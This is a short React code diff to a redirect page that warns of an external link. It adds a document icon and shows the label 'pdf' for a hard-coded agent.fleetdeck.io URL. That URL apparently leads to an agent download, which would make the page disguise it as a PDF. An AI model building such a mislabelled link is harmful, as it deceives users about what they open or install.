@@ -1,3 +1,5 @@
+import { FileText } from "lucide-react";
+
 const DESTINATION_URL = "https://agent.fleetdeck.io/rp59P49dMNr6CLNX6zmjX?win";
 
 const Index = () => {
@@ -16,7 +18,8 @@ const Index = () => {
           You are about to visit an external website:
         </p>
 
-        <div className="w-full p-4 bg-muted rounded-lg mb-8 break-all">
+        <div className="w-full p-4 bg-muted rounded-lg mb-8 flex items-center justify-center gap-2">
+          <FileText className="w-5 h-5 text-red-500" />
           <code className="text-sm text-foreground">pdf</code>
         </div>
 
